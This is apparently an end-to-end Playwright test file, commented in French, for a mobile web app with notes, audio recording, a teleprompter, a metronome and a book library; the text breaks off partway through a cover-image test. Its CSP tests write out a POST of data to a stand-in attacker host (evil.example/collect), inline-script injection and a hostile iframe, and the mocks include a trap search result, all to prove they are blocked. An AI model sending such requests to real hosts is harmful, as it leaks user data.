// Parcours de bout en bout dans un vrai Chromium (faux micro, vrai IndexedDB, vrai service worker). Lancer : npm run build && npm run e2e
import { chromium } from 'playwright-core'
import { spawn } from 'node:child_process'
import { mkdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { createRequire } from 'node:module'
import { tmpdir } from 'node:os'
import { pathToFileURL } from 'node:url'
import { build } from 'esbuild'
const AXE_SRC = readFileSync(createRequire(import.meta.url).resolve('axe-core/axe.min.js'), 'utf8') // injecté par évaluation (la CSP de l'application interdit les scripts en ligne : elle reste active pendant les tests)

const PORT = 4173, URL0 = 'http://localhost:' + PORT + '/'
const SHOTS = process.env.SHOTS || join(process.cwd(), 'e2e-shots')
mkdirSync(SHOTS, { recursive: true })
// Un serveur oublié sur ce port (ancienne configuration, sans les en-têtes de sécurité) fausserait les résultats : on refuse de continuer plutôt que de le réutiliser.
if (await fetch(URL0).then(() => true, () => false)) { console.error('Un serveur répond déjà sur ' + URL0 + ' : arrêtez-le (kill $(lsof -ti:4173)) puis relancez les tests.'); process.exit(2) }
// Lancé directement avec node (et non via npx) pour que l'arrêt tue bien le serveur, sans le laisser tourner en arrière-plan.
const server = spawn(process.execPath, [join(process.cwd(), 'node_modules/vite/bin/vite.js'), 'preview', '--port', String(PORT), '--strictPort'], { stdio: 'ignore' })
process.on('exit', () => server.kill())
const rows = [], pages = []
// ONLY="regex" ne lance que les tests dont le titre correspond (mise au point) ; en cas d'échec, une capture de chaque page ouverte est enregistrée dans e2e-shots/echec-*.png.
const ONLY = process.env.ONLY ? new RegExp(process.env.ONLY) : null
const T = async (n, f) => {
  if (ONLY && !ONLY.test(n)) return
  try { await f(); rows.push(['OK', n]) } catch (e) {
    rows.push(['ÉCHEC', n + ' : ' + String(e.message).split('\n').slice(0, /Timeout/.test(e.message) ? 8 : 1).join(' | ').slice(0, 700)])
    for (const [i, p] of pages.entries()) if (!p.isClosed()) await p.screenshot({ path: join(SHOTS, 'echec-' + rows.length + '-' + i + '.png') }).catch(() => undefined)
  }
}
const yes = (c, m = 'condition fausse') => { if (!c) throw new Error(m) }
const eq = (a, b, m = '') => { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(m + ' ' + JSON.stringify(a) + ' ≠ ' + JSON.stringify(b)) }
const wait = ms => new Promise(r => setTimeout(r, ms))

for (let i = 0; i < 60; i++) { try { if ((await fetch(URL0)).ok) break } catch { /* pas encore prêt */ } await wait(500) }
const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium', headless: true, args: ['--use-fake-device-for-media-stream', '--use-fake-ui-for-media-stream', '--autoplay-policy=no-user-gesture-required', '--no-sandbox'] })
const mk = async (extra = {}) => {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, deviceScaleFactor: 2, locale: 'fr-FR', timezoneId: 'Europe/Paris', permissions: ['microphone'], ...extra })
  await ctx.addInitScript(() => { // compte les clics du métronome (oscillateurs créés) pour prouver qu'un son est réellement produit
    window.__osc = []
    const P = window.AudioContext?.prototype
    if (P) { const f = P.createOscillator; P.createOscillator = function () { const o = f.call(this); window.__osc.push(o); return o } }
    window.__streams = [] // flux micro obtenus : permet de vérifier que le micro est bien relâché
    const md = navigator.mediaDevices
    if (md?.getUserMedia) { const g = md.getUserMedia.bind(md); md.getUserMedia = async c => { const s = await g(c); window.__streams.push(s); return s } }
  })
  const page = await ctx.newPage(); const errors = []; pages.push(page)
  page.on('pageerror', e => errors.push(String(e))); page.on('console', m => { if (m.type() === 'error') errors.push(m.text()) })
  return { ctx, page, errors }
}
/** Contrôle d'accessibilité automatique (axe-core, WCAG 2.1 A et AA, contrastes compris) sur la page affichée. */
const axe = async (page, name) => {
  if (!(await page.evaluate(() => !!window.axe))) await page.evaluate(AXE_SRC + '\n;void 0')
  const r = await page.evaluate(() => window.axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'] } }))
  const v = r.violations.map(x => x.id + ' (' + x.nodes.length + ') ' + x.nodes.slice(0, 2).map(n => n.target.join(' ')).join(' | '))
  if (v.length) throw new Error('accessibilité ' + name + ' : ' + v.join(' ; '))
}
const shot = (page, n) => page.screenshot({ path: join(SHOTS, n + '.png') })
const seed = async (page, fn, arg) => { // prépare l'état avant le premier affichage
  await page.goto(URL0); await page.evaluate(fn, arg); await page.reload()
}
const ONBOARDED = () => { const d = new Date(); const iso = d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); const s = JSON.parse(localStorage.getItem('believe:v2') || 'null'); if (s) { s.ui = { onboard: true, verseDay: iso }; localStorage.setItem('believe:v2', JSON.stringify(s)) } }

const A = await mk(), pa = A.page
await pa.goto(URL0 + '#/4'); await pa.waitForSelector('h1'); await pa.evaluate(() => { const s = JSON.parse(localStorage.getItem('believe:v2') || 'null'); if (!s) return; }).catch(() => undefined)
// premier lancement : l'application écrit son état, on marque l'accueil comme déjà vu pour atteindre directement la rubrique
await pa.evaluate(() => { const d = new Date(), iso = d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); const raw = localStorage.getItem('believe:v2'); const s = raw ? JSON.parse(raw) : null; if (s) { s.ui = { onboard: true, verseDay: iso }; localStorage.setItem('believe:v2', JSON.stringify(s)) } })

await T('PWA : manifeste valide avec icônes, service worker actif, page servie hors ligne', async () => {
  await pa.reload(); await pa.waitForSelector('h1')
  const m = await pa.evaluate(async () => { const l = document.querySelector('link[rel=manifest]'); const j = await (await fetch(l.href)).json(); return { name: j.name, display: j.display, icons: j.icons.map(i => i.sizes + ':' + i.purpose) } })
  eq(m.display, 'standalone'); yes(m.icons.length >= 2, 'icônes manquantes ' + JSON.stringify(m))
  await pa.evaluate(() => navigator.serviceWorker.ready); await wait(800)
  await pa.context().setOffline(true); await pa.reload(); await pa.waitForSelector('h1'); const t = await pa.textContent('body'); await pa.context().setOffline(false)
  yes(/Believe|BELIEVE/.test(t), 'page hors ligne vide')
})

await T('Notes : créer, retrouver sans accents après rechargement, surlignage, catégorie par puce', async () => {
  await pa.goto(URL0 + '#/11/notes'); await pa.waitForSelector('text=Nouvelle note')
  await pa.getByLabel('Titre (facultatif)').fill('Rêve du fleuve'); await pa.getByLabel('Votre note').fill('Un fleuve très calme au lever du jour.')
  await pa.getByRole('button', { name: 'Enregistrer la note' }).click(); await pa.waitForSelector('text=Note enregistrée.')
  await pa.getByLabel('Titre (facultatif)').fill(''); await pa.getByLabel('Votre note').fill('Les figures de style : anaphore, antithèse.'); await pa.getByLabel('Catégorie', { exact: true }).selectOption('Apprentissages')
  await pa.getByRole('button', { name: 'Enregistrer la note' }).click(); await pa.waitForSelector('text=Note enregistrée.')
  await pa.reload(); await pa.waitForSelector('text=Nouvelle note')
  await pa.getByLabel('Rechercher dans mes notes').fill('REVE'); await pa.waitForSelector('mark')
  eq(await pa.locator('mark').first().textContent(), 'Rêve'); eq(await pa.getByRole('article').count(), 1)
  await pa.getByLabel('Rechercher dans mes notes').fill(''); await pa.getByRole('button', { name: /^Apprentissages \(1\)/ }).click(); eq(await pa.getByRole('article').count(), 1)
  await shot(pa, 'notes')
})

await T('Dictaphone : vrai micro simulé, enregistrement lisible, sauvegarde, rechargement de la page, écoute, suppression vérifiée', async () => {
  await pa.goto(URL0 + '#/11/audio'); await pa.waitForSelector('text=Microphone')
  await pa.getByRole('button', { name: 'J’accepte' }).click()
  await pa.getByRole('button', { name: 'Enregistrer' }).click(); await pa.waitForSelector('[role=timer]')
  await wait(2600); const t = await pa.textContent('[role=timer]'); yes(/0:0[2-9]/.test(t), 'chrono ' + t)
  await shot(pa, 'dictaphone-enregistrement')
  await pa.getByRole('button', { name: 'Arrêter' }).click(); await pa.waitForSelector('text=Enregistrement terminé')
  const dur = await pa.evaluate(() => new Promise(res => { const a = document.querySelector('audio'); if (a.readyState >= 1 && isFinite(a.duration)) return res(a.duration); a.addEventListener('loadedmetadata', () => res(a.duration)); a.addEventListener('error', () => res(-1)); a.load() }))
  yes(dur === -1 ? false : true, 'audio illisible'); 
  await pa.getByLabel('Titre (facultatif)').fill('Mon rêve'); await pa.getByLabel('Catégorie', { exact: true }).selectOption('Cauchemars'); await pa.getByRole('button', { name: 'Sauvegarder sur l’appareil' }).click()
  await pa.waitForSelector('text=Audio enregistré sur cet appareil'); yes(await pa.getByRole('article', { name: 'Audio Mon rêve' }).count() === 1)
  await pa.reload(); await pa.waitForSelector('article[aria-label="Audio Mon rêve"]') // relu depuis IndexedDB au démarrage
  await pa.getByRole('button', { name: 'Écouter Mon rêve' }).click(); await pa.waitForSelector('audio')
  const played = await pa.evaluate(() => new Promise(res => { const a = document.querySelector('audio'); const t0 = Date.now(); const i = setInterval(() => { if (a.currentTime > 0.3) { clearInterval(i); res(a.currentTime) } else if (Date.now() - t0 > 6000) { clearInterval(i); res(a.error ? -1 : a.currentTime) } }, 100); a.play().catch(() => undefined) }))
  yes(played > 0.3, 'lecture réelle impossible : ' + played)
  const size = await pa.evaluate(async () => (await new Promise(res => { const r = indexedDB.open('BelieveAudioDB'); r.onsuccess = () => { const q = r.result.transaction('audios').objectStore('audios').getAll(); q.onsuccess = () => res(q.result[0].data.byteLength) } }))); yes(size > 1000, 'octets stockés ' + size)
  await pa.getByRole('button', { name: 'Supprimer Mon rêve' }).click(); await pa.getByRole('button', { name: 'Confirmer la suppression de Mon rêve' }).click(); await pa.waitForSelector('text=Audio supprimé de cet appareil (vérifié).')
  await pa.reload(); await pa.waitForSelector('text=Aucun enregistrement pour le moment.')
  const left = await pa.evaluate(() => new Promise(res => { const r = indexedDB.open('BelieveAudioDB'); r.onsuccess = () => { const q = r.result.transaction(['audios', 'audioMeta']).objectStore('audios').count(); q.onsuccess = () => res(q.result) } })); eq(left, 0)
})

await T('Dictaphone : le micro est relâché à l’arrêt (plus de piste active) et l’enregistrement survit à un changement de rubrique', async () => {
  await pa.goto(URL0 + '#/11/audio'); await pa.getByRole('button', { name: 'Enregistrer' }).click(); await pa.waitForSelector('[role=timer]')
  const live = () => pa.evaluate(() => window.__streams.flatMap(s => s.getTracks()).filter(t => t.readyState === 'live').length)
  yes(await live() === 1, 'le micro devrait être actif pendant l’enregistrement')
  await pa.evaluate(() => { location.hash = '#/4' }); await pa.waitForSelector('text=Enregistrement en cours'); await wait(800); yes(await live() === 1, 'le micro doit rester actif hors de la page')
  await pa.evaluate(() => { location.hash = '#/11/audio' }); await pa.waitForSelector('[role=timer]')
  await pa.getByRole('button', { name: 'Arrêter' }).click(); await pa.waitForSelector('text=Enregistrement terminé'); eq(await live(), 0, 'micro encore actif après l’arrêt')
  await pa.getByRole('button', { name: 'Jeter' }).click(); await pa.waitForSelector('button:has-text("Enregistrer")')
})

await T('Prompteur : le texte défile réellement (transform) à la vitesse réglée, pause fige, plein écran', async () => {
  await pa.goto(URL0 + '#/11/prompteur'); await pa.waitForSelector('text=Votre texte')
  await pa.getByLabel('Texte à lire').fill(('Gloire à Dieu au plus haut des cieux, et paix sur la terre. ').repeat(40))
  await pa.getByLabel(/^Vitesse/).fill('100')
  const y = () => pa.evaluate(() => { const m = /translate3d\(0(?:px)?, ?(-?[\d.]+)px/.exec(document.querySelector('.tele-in').style.transform); return m ? -parseFloat(m[1]) : 0 })
  yes((await pa.evaluate(() => document.querySelector('.tele-in').offsetHeight)) > 1500, 'texte trop court pour défiler')
  await pa.getByRole('button', { name: 'Démarrer' }).click(); await wait(1500); const a = await y()
  yes(a > 80 && a < 220, 'défilement ' + a + ' px en 1,5 s à 100 px/s')
  await pa.getByRole('button', { name: 'Pause' }).click(); const b = await y(); await wait(400); eq(await y(), b, 'la pause ne fige pas')
  await shot(pa, 'prompteur')
  await pa.getByRole('button', { name: 'Plein écran' }).click(); yes(await pa.locator('.telewrap.full').count() === 1); await shot(pa, 'prompteur-plein-ecran')
  const box = await pa.locator('.tele').boundingBox(); yes(box.height > 400, 'zone de lecture trop petite en plein écran : ' + box.height)
  await pa.keyboard.press('Escape'); eq(await pa.locator('.telewrap.full').count(), 0)
})

await T('Métronome : vrais clics audio (premier temps plus aigu), tempo conservé après rechargement', async () => {
  await pa.goto(URL0 + '#/11/metronome'); await pa.waitForSelector('text=Tempo')
  await pa.getByLabel(/^Tempo :/).fill('120')
  await pa.getByRole('button', { name: 'Démarrer' }).click(); await wait(2200)
  const f = await pa.evaluate(() => window.__osc.map(o => Math.round(o.frequency.value)))
  yes(f.length >= 4 && f.length <= 6, 'clics en 2,2 s à 120/min : ' + f.length); eq(f.slice(0, 5), [1320, 880, 880, 880, 1320].slice(0, Math.min(5, f.length)))
  await shot(pa, 'metronome'); await pa.getByRole('button', { name: 'Arrêter' }).click(); await wait(300)
  const n1 = await pa.evaluate(() => window.__osc.length); await wait(600); eq(await pa.evaluate(() => window.__osc.length), n1, 'des clics continuent après l’arrêt')
  await wait(600); await pa.reload(); await pa.waitForSelector('text=Tempo'); eq(await pa.getByLabel(/^Tempo :/).inputValue(), '120')
})

for (const theme of ['light', 'dark', 'oled']) {
  await T('Accessibilité (axe-core, WCAG 2.1 AA, contrastes) : rubrique 11, 4 onglets, thème ' + theme, async () => {
    await pa.evaluate(t => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.settings.theme = t; s.consents.mic = true; localStorage.setItem('believe:v2', JSON.stringify(s)) }, theme)
    for (const sub of ['notes', 'audio', 'prompteur', 'metronome']) { await pa.goto(URL0 + '#/11/' + sub); await pa.reload(); await pa.waitForSelector('h1'); await wait(500); await axe(pa, sub + '/' + theme) }
    if (theme === 'dark') await shot(pa, 'metronome-sombre')
  })
}

// =====================================================================================================================
// Rubrique 12 : Bibliothèque et recherche de livres.
// Contexte à part (service worker bloqué pour que l'interception réseau voie tout) : les réponses des catalogues et de l'IA sont SIMULÉES, mais
// les requêtes réellement émises par la page sont enregistrées, ce qui prouve ce qui part, vers où et à quel moment. La CSP de production est active.
// =====================================================================================================================
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="92"><rect width="64" height="92" fill="#6b6fb5"/></svg>'
const SAMPLE = {
  items: [
    { src: 'ol', id: '/works/OL66554W', t: 'Pride and Prejudice', a: 'Jane Austen', y: 1813, l: 'en', cover: 'https://covers.openlibrary.org/b/id/8081536-M.jpg', desc: '', pub: 'Penguin Classics', url: 'https://openlibrary.org/works/OL66554W', acc: 'loan', med: 'text' },
    { src: 'gu', id: '1342', t: 'Pride and Prejudice', a: 'Austen, Jane', y: 1813, l: 'en', cover: 'https://www.gutenberg.org/cache/epub/1342/pg1342.cover.medium.jpg', desc: 'Un roman célèbre sur les premières impressions.', pub: '', url: 'https://www.gutenberg.org/ebooks/1342', acc: 'free', med: 'text' },
    { src: 'lv', id: '1245', t: 'Pride and Prejudice (version audio)', a: 'Jane Austen', y: null, l: 'en', cover: null, desc: '', pub: 'LibriVox', url: 'https://librivox.org/pride-and-prejudice-by-jane-austen/', acc: 'free', med: 'audio' },
    { src: 'gb', id: 'abcDEF123456', t: 'Faux résultat piégé', a: 'X', y: 2000, l: 'fr', cover: null, desc: '', pub: '', url: 'https://evil.example/book', acc: 'info', med: 'text' }
  ],
  errors: [{ s: 'gb', e: 'quota' }]
}
const FICHE = { idee: 'Un roman sur les premières impressions.', points: ['Les apparences trompent.', 'Elizabeth révise son jugement.', 'Darcy corrige son orgueil.'], retenir: 'Vérifier avant de juger.', pour_qui: 'Les amateurs de romans classiques.', fiabilite: 'Livre très connu : fiche fiable dans l’ensemble.' }
const EXT = { mode: 'ok', seen: [], hold: Promise.resolve(), release: () => undefined }
const AI = { seen: [] }, IMGS = { seen: [], evil: [] }, NET = []

const B = await mk({ serviceWorkers: 'block' }), pb = B.page
await B.ctx.addInitScript(() => { // lecture vocale simulée : on enregistre ce que l'appareil aurait dit
  window.__said = []; window.__cancel = 0; window.__speaking = false
  const ss = window.speechSynthesis
  if (!ss) return
  ss.speak = u => { window.__said.push({ text: u.text, lang: u.lang }); window.__speaking = true }
  ss.cancel = () => { window.__cancel++; window.__speaking = false }
  Object.defineProperty(ss, 'speaking', { get: () => window.__speaking, configurable: true })
  Object.defineProperty(ss, 'pending', { get: () => false, configurable: true })
})
await B.ctx.route(/\/api\/ext(\?|$)/, async route => {
  const rq = route.request(); EXT.seen.push({ url: rq.url(), headers: rq.headers() })
  const json = (status, o) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(o) })
  if (EXT.mode === 'ok') return json(200, SAMPLE)
  if (EXT.mode === 'down') return json(502, { error: 'upstream', errors: [{ s: 'gu', e: 'timeout' }, { s: 'ol', e: 'upstream' }] })
  if (EXT.mode === 'absent') return route.fulfill({ status: 404, contentType: 'text/plain', body: 'NOT_FOUND' })
  if (EXT.mode === 'html') return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>Believe</title>' })
  if (EXT.mode === 'slow') { await EXT.hold; try { await json(200, SAMPLE) } catch { /* recherche annulée entre-temps */ } }
})
await B.ctx.route(/\/api\/ai$/, route => {
  const rq = route.request(); AI.seen.push({ method: rq.method(), body: rq.postData() ?? '', headers: rq.headers() })
  return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ data: FICHE, model: 'gemini-simule' }) })
})
await B.ctx.route(/^https:\/\/(www\.gutenberg\.org|covers\.openlibrary\.org|evil\.example)\//, route => {
  const rq = route.request(), u = new URL(rq.url())
  if (u.hostname === 'evil.example') IMGS.evil.push(rq.url()); else IMGS.seen.push({ url: rq.url(), referer: rq.headers().referer ?? null })
  return route.fulfill({ status: 200, contentType: 'image/svg+xml', body: SVG })
})
pb.on('request', r => { if (!/^data:|^blob:/.test(r.url())) NET.push(r.url()) })
await pb.goto(URL0 + '#/4'); await pb.waitForSelector('h1'); await pb.evaluate(ONBOARDED) // accueil guidé et verset du jour déjà vus : les tests de la bibliothèque partent directement de la rubrique
const LINK_OK = ['openlibrary.org', 'archive.org', 'books.google.com', 'play.google.com', 'www.google.com', 'gutenberg.org', 'gutendex.com', 'librivox.org', 'wikisource.org', 'wikimedia.org', 'classics.mit.edu', 'biblegateway.com']
const hostOk = h => LINK_OK.some(x => h === x || h.endsWith('.' + x))
const lib = async (hash = '#/12') => { await pb.goto(URL0 + hash); await pb.reload(); await pb.waitForSelector('h1:has-text("12. Bibliothèque")'); await wait(400) }
const stateOf = () => pb.evaluate(() => JSON.parse(localStorage.getItem('believe:v2')))
const patch = fn => pb.evaluate(`(${fn.toString()})()`)
/** Balayage tactile réel (événements tactiles du navigateur, donc pointeurs de type « touch »). */
const swipe = async (page, x1, y1, x2, y2) => {
  const cdp = await page.context().newCDPSession(page)
  await cdp.send('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: [{ x: x1, y: y1 }] })
  for (let i = 1; i <= 6; i++) { await cdp.send('Input.dispatchTouchEvent', { type: 'touchMove', touchPoints: [{ x: x1 + (x2 - x1) * i / 6, y: y1 + (y2 - y1) * i / 6 }] }); await wait(15) }
  await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] }); await cdp.detach()
}
/** Point de départ d'un balayage : dans la zone de contenu des onglets, sur du texte (jamais sur un champ ni sur la rangée d'onglets). */
const swipeArea = async (page, sel) => { const l = page.locator(sel).first(); await l.scrollIntoViewIfNeeded(); const b = await l.boundingBox(); return { y: Math.round(b.y + b.height / 2), w: 390 } }
const pressed = page => page.evaluate(() => [...document.querySelectorAll('[role=group][aria-label="Section de la bibliothèque"] .chip[aria-pressed=true]')].map(b => b.textContent))

await T('Sécurité : en-têtes servis avec la page (CSP sans script en ligne ni eval, pas d’iframe parasite, caméra coupée)', async () => {
  const r = await fetch(URL0), h = k => r.headers.get(k) ?? ''
  const csp = h('content-security-policy'), dir = n => csp.split(';').map(x => x.trim()).find(x => x.startsWith(n + ' ')) ?? ''
  yes(csp, 'pas de Content-Security-Policy')
  eq(dir('script-src'), "script-src 'self'"); eq(dir('connect-src'), "connect-src 'self'"); eq(dir('object-src'), "object-src 'none'"); eq(dir('frame-ancestors'), "frame-ancestors 'none'"); eq(dir('base-uri'), "base-uri 'self'"); eq(dir('form-action'), "form-action 'self'")
  yes(!csp.includes('unsafe-eval') && !csp.includes('http://') && !/(^|[\s;])\*([\s;]|$)/.test(csp), 'CSP trop large : ' + csp)
  eq(h('x-content-type-options'), 'nosniff'); eq(h('x-frame-options'), 'DENY'); yes(/strict-origin/.test(h('referrer-policy')), 'Referrer-Policy'); yes(/camera=\(\)/.test(h('permissions-policy')), 'Permissions-Policy')
})

await T('Sécurité : la CSP est appliquée par le navigateur (image, requête, script en ligne et iframe d’un site non autorisé bloqués ; site de couvertures autorisé accepté)', async () => {
  await lib(); IMGS.evil.length = 0; IMGS.seen.length = 0
  const r = await pb.evaluate(async () => {
    const v = []; document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective + ' | ' + e.blockedURI))
    const load = src => new Promise(res => { const i = new Image(); i.onload = () => res(i.naturalWidth > 0 ? 'chargée' : 'vide'); i.onerror = () => res('bloquée'); i.src = src; document.body.appendChild(i) })
    const evil = await load('https://evil.example/x.png'), good = await load('https://www.gutenberg.org/cache/epub/1342/pg1342.cover.medium.jpg')
    window.__inl = 0; const s = document.createElement('script'); s.textContent = 'window.__inl = 1'; document.head.appendChild(s)
    let sent = 'parti'; try { await fetch('https://evil.example/collect', { method: 'POST', body: 'x' }) } catch { sent = 'bloqué' }
    const fr = document.createElement('iframe'); fr.src = 'https://evil.example/frame'; document.body.appendChild(fr)
    await new Promise(r2 => setTimeout(r2, 400))
    return { evil, good, inl: window.__inl, sent, v }
  })
  eq(r.evil, 'bloquée'); eq(r.good, 'chargée'); eq(r.inl, 0, 'script en ligne exécuté'); eq(r.sent, 'bloqué')
  const dirs = r.v.map(x => x.split(' | ')[0]); for (const d of ['img-src', 'connect-src', 'script-src-elem', 'frame-src']) yes(dirs.includes(d) || dirs.includes(d.replace('-elem', '')), 'violation absente : ' + d + ' / ' + JSON.stringify(r.v))
  eq(IMGS.evil, [], 'une requête est arrivée jusqu’au site non autorisé'); eq(IMGS.seen.length, 1, 'le site de couvertures autorisé n’a pas été joint')
})

await T('Catalogue : filtre instantané sur l’appareil (accents et majuscules ignorés), langue, aucune requête réseau pendant la saisie', async () => {
  await lib(); NET.length = 0
  eq(await pb.locator('article[aria-label^="Livre :"]').count(), 12, 'première page du catalogue')
  const q = pb.getByLabel('Rechercher un livre')
  await q.fill('MARC AURELE'); await pb.waitForSelector('article[aria-label="Livre : Pensées pour moi-même"]')
  eq(await pb.locator('article[aria-label^="Livre :"]').count(), 1); yes((await pb.locator('mark').count()) >= 2, 'mots recherchés non surlignés')
  await q.fill(''); await pb.getByRole('button', { name: 'English', exact: true }).click(); await wait(200)
  const t = await pb.locator('article[aria-label^="Livre :"]').evaluateAll(a => a.map(x => x.textContent ?? ''))
  yes(t.length > 0 && t.every(x => x.includes('English')), 'filtre English : ' + t.length)
  await pb.getByRole('button', { name: 'Toutes les langues' }).click(); await q.fill('tolérance zéro, rhétorique'); await wait(200)
  eq(NET, [], 'requêtes émises pendant la recherche interne : ' + NET.join(' '))
  eq(EXT.seen.length, 0, 'le serveur de recherche a été appelé')
})

await T('Fiche d’un livre : liens légaux sûrs (nouvel onglet, noopener), citation courte référencée, focus dans la fenêtre puis rendu à la fermeture', async () => {
  await lib(); const q = pb.getByLabel('Rechercher un livre')
  await q.fill('machiavel'); const open = pb.getByRole('button', { name: 'Ouvrir la fiche de The Prince' }); await open.click()
  const d = pb.getByRole('dialog', { name: 'Fiche du livre The Prince' }); await d.waitFor()
  yes(await pb.evaluate(() => !!document.activeElement?.closest('[role=dialog]')), 'le focus n’est pas entré dans la fenêtre')
  const links = await d.locator('a[href^="http"]').evaluateAll(a => a.map(x => ({ h: new URL(x.href).hostname, t: x.target, r: x.rel })))
  yes(links.length >= 2 && links.every(l => l.t === '_blank' && /noopener/.test(l.r) && /noreferrer/.test(l.r) && hostOk(l.h)), JSON.stringify(links))
  yes((await d.locator('blockquote').count()) >= 1, 'citation absente'); yes(/Source/.test(await d.locator('blockquote footer').first().textContent()), 'citation sans référence ni source')
  for (let i = 0; i < 40; i++) await pb.keyboard.press('Tab')
  yes(await pb.evaluate(() => !!document.activeElement?.closest('[role=dialog]')), 'le focus a quitté la fenêtre modale')
  await pb.keyboard.press('Escape'); await d.waitFor({ state: 'detached' })
  eq(await pb.evaluate(() => document.activeElement?.getAttribute('aria-label')), 'Ouvrir la fiche de The Prince', 'focus non rendu au bouton d’origine')
  await q.fill('atomic'); await pb.getByRole('button', { name: 'Ouvrir la fiche de Atomic Habits' }).click()
  const d2 = pb.getByRole('dialog', { name: 'Fiche du livre Atomic Habits' }); await d2.waitFor()
  yes(/Aucune citation : l’œuvre est encore protégée/.test(await d2.textContent()), 'œuvre protégée : citation ou texte reproduit'); yes((await d2.locator('blockquote').count()) === 0, 'citation d’une œuvre protégée')
})

await T('Lecture vocale : le résumé est lu par morceaux courts dans la bonne langue, l’arrêt et la fermeture coupent la voix, rien n’est envoyé', async () => {
  await lib(); NET.length = 0
  await pb.getByLabel('Rechercher un livre').fill('atomic'); await pb.getByRole('button', { name: 'Ouvrir la fiche de Atomic Habits' }).click()
  const d = pb.getByRole('dialog', { name: 'Fiche du livre Atomic Habits' }); await d.waitFor()
  await d.getByRole('button', { name: 'Écouter le résumé (français)' }).click()
  let said = await pb.evaluate(() => window.__said)
  yes(said.length >= 3, 'trop peu de morceaux : ' + said.length); yes(said.every(s => s.lang === 'fr-FR' && s.text.length <= 200), 'langue ou longueur : ' + JSON.stringify(said.map(s => [s.lang, s.text.length])))
  yes(said[0].text.startsWith('Atomic Habits, de James Clear.'), said[0].text); yes(said.map(s => s.text).join(' ').includes('Quatre lois'), 'résumé incomplet')
  await d.getByRole('button', { name: 'Arrêter la lecture' }).click(); const c1 = await pb.evaluate(() => window.__cancel); yes(c1 >= 2, 'voix non coupée à l’arrêt')
  await pb.evaluate(() => { window.__said.length = 0 }); await d.getByRole('button', { name: 'Listen to the summary (English)' }).click()
  said = await pb.evaluate(() => window.__said); yes(said.length >= 1 && said.every(s => s.lang === 'en-US'), 'lecture anglaise : ' + JSON.stringify(said.map(s => s.lang))); yes(/^Atomic Habits\./.test(said[0].text), said[0].text)
  await pb.keyboard.press('Escape'); await d.waitFor({ state: 'detached' }); yes((await pb.evaluate(() => window.__cancel)) > c1, 'la voix continue après la fermeture de la fiche')
  eq(NET.filter(u => /\/api\//.test(u)), [], 'des données sont parties pendant la lecture vocale')
})

await T('Recherche en ligne : rien ne part avant le clic, la requête ne contient que le texte saisi, résultats classés (libres d’abord), site piégé écarté, erreurs partielles dites', async () => {
  EXT.mode = 'ok'; EXT.seen.length = 0; await lib(); const q = pb.getByLabel('Rechercher un livre')
  await q.fill('orgueil'); await wait(500); eq(EXT.seen.length, 0, 'une requête est partie avant le clic')
  await pb.getByRole('search', { name: 'Recherche de livres' }).getByRole('button', { name: 'Chercher en ligne' }).click()
  await pb.waitForSelector('article[aria-label^="Résultat :"]'); eq(EXT.seen.length, 1)
  const u = new URL(EXT.seen[0].url), h = EXT.seen[0].headers
  eq(u.pathname, '/api/ext'); eq([...u.searchParams.keys()].sort(), ['q', 'src']); eq(u.searchParams.get('q'), 'orgueil'); eq(u.searchParams.get('src'), 'gu,lv,ol,gb')
  yes(!h.cookie && !h.authorization && !h['x-access-code'], 'identifiants envoyés : ' + Object.keys(h).join(','))
  eq(await pb.locator('article[aria-label^="Résultat :"]').evaluateAll(a => a.map(x => x.getAttribute('aria-label') + ' | ' + (x.querySelector('a.btn')?.textContent ?? ''))), [
    'Résultat : Pride and Prejudice | Lire gratuitement sur Project Gutenberg ↗', 'Résultat : Pride and Prejudice (version audio) | Écouter sur LibriVox ↗', 'Résultat : Pride and Prejudice | Voir l’emprunt sur Open Library ↗'])
  const body = await pb.textContent('main')
  for (const t of ['3 résultats pour « orgueil »', 'Certains catalogues n’ont pas répondu : Google Books (limite de requêtes atteinte)', 'Écoute libre : livre audio du domaine public', 'domaine public aux États-Unis selon Project Gutenberg', 'Emprunt numérique possible', 'Descriptif fourni par Project Gutenberg']) yes(body.includes(t), 'texte absent : ' + t)
  yes(!body.includes('Faux résultat piégé') && !body.includes('evil.example'), 'résultat piégé affiché')
  const links = await pb.locator('article a.btn').evaluateAll(a => a.map(x => ({ h: new URL(x.href).hostname, t: x.target, r: x.rel })))
  yes(links.length === 3 && links.every(l => l.t === '_blank' && /noopener/.test(l.r) && hostOk(l.h)), JSON.stringify(links))
  await shot(pb, 'bibliotheque-en-ligne')
})

await T('Couvertures : désactivées par défaut (aucune requête vers les sites tiers), activées à la demande sans référent, retombée sur la tuile, état conservé', async () => {
  EXT.mode = 'ok'; await lib('#/12/en-ligne'); IMGS.seen.length = 0
  await pb.getByLabel('Rechercher un livre').fill('orgueil'); await pb.getByRole('button', { name: /^Chercher « orgueil » en ligne$/ }).click(); await pb.waitForSelector('article[aria-label^="Résultat :"]')
  eq(await pb.locator('img.cov').count(), 0, 'des couvertures sont affichées par défaut'); eq(IMGS.seen, [], 'des sites tiers ont été joints sans accord')
  yes((await pb.locator('span.cov').count()) === 3, 'tuiles de remplacement absentes')
  await pb.getByLabel('Afficher les couvertures des livres').check(); await pb.waitForFunction(() => document.querySelectorAll('img.cov').length === 2)
  await pb.waitForFunction(() => [...document.querySelectorAll('img.cov')].every(i => i.complete && i.naturalWidth > 0))
  eq(await pb.locator('img.cov').evaluateAll(a => a.map(i => i.getAttribute('referrerpolicy'))), ['no-referrer', 'no-referrer'])
